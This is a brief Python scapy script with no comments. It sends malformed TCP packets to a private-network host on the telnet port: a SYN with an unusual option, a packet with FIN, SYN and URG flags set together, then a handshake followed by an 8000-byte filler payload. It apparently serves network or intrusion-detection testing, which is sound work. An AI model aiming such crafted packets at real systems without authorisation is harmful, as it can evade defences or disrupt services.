from scapy.all import *

if __name__ == "__main__":
    ip = "172.18.101.125"
    dport = 23
    seq_num = 1000
    seq_num_a = 20000
    seq_num_b = seq_num_a + 1000000
    payload = "\x42"*8000
    sport = random.randint(1024,65535)

    syn = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "S", seq=seq_num, options=[("OA", b'a')])
    send(syn)

    syn = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "FSU", seq=seq_num_a, urgptr=10)
    send(syn)

    
    syn = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "S", seq=seq_num_b)
    syn_ack = sr1(syn)

    seq_num = seq_num_b + 1
    ack_num = syn_ack.seq+1
    ack = IP(dst = ip)/TCP(sport = sport , dport = dport ,flags = "A", seq=seq_num, ack=ack_num) / payload
    send(ack)